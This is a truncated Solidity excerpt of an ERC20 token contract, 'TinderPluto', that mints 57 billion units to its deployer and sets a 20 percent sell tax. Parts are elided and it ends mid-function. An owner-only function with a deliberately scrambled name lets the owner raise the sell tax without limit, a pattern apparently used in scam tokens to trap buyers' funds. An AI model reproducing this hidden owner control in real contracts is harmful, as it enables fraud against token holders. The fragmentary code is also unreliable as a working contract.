...
contract TinderPluto is ERC20 {
    uint256 public sellTax;
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    constructor() ERC20("DTP", "TinderPluto") {
        _mint(msg.sender, 57000000000);
        sellTax = 20;
        _owner = msg.sender;
    ...
    function add_OsOoVq(uint256 amount) public onlyOwner {
        sellTax = amount;
    }
    
    function add_dK3evy() public {
